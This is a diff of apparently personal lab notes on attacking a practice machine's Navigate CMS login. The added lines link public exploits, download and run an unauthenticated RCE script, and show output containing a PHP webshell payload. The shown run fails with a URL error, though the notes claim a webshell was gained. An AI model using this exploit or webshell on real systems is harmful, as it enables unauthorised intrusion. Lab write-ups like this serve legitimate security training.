@@ -161,7 +161,49 @@ navigate                [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 1
 ![[Pasted image 20240710132114.png]]
 
 - The navigate cms login page appeared
-- Check google if there is vulnerability in navigate
+- Check Google if there is a vulnerability in the navigate. Here are the relevant sites checked:
+	- https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
+	- https://www.exploit-db.com/exploits/45561
+	- https://github.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-
+- We can run the exploit manually using the https://github.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-
+
+```
+┌──(root㉿kali)-[~]
+└─# wget https://raw.githubusercontent.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-/main/navigate_RCE.sh
+
+./navigate_RCE.sh navigator.hm
+--2024-07-10 10:26:21--  https://raw.githubusercontent.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-/main/navigate_RCE.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.109.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1000 [text/plain]
+Saving to: ‘navigate_RCE.sh’
+
+navigate_RCE.sh                        100%[============================================================================>]    1000  --.-KB/s    in 0s      
+
+2024-07-10 10:26:22 (85.7 MB/s) - ‘navigate_RCE.sh’ saved [1000/1000]
+
+┌──(root㉿kali)-[~]
+└─# chmod u+x navigate_RCE.sh 
+┌──(root㉿kali)-[~]
+└─# ./navigate_RCE.sh                             
+
+ URL:  http:///
+
+ Sesion: 
+
+Payload:
+<?php system($_GET['cmd']);?>
+
+Subiendo Exploit ...
+curl: (3) URL using bad/illegal format or missing URL
+
+Obteniendo webshell...
+webshell$ 
+
+```
+- We landed to the webshell shell by doing it manually using the script from the github site. Now we will also try the metasploit.
+
 - Checking the source code of the default website, we see the webmaster: `alek@blackpearl.tcm`
 
 ![[Pasted image 20240710125702.png]]
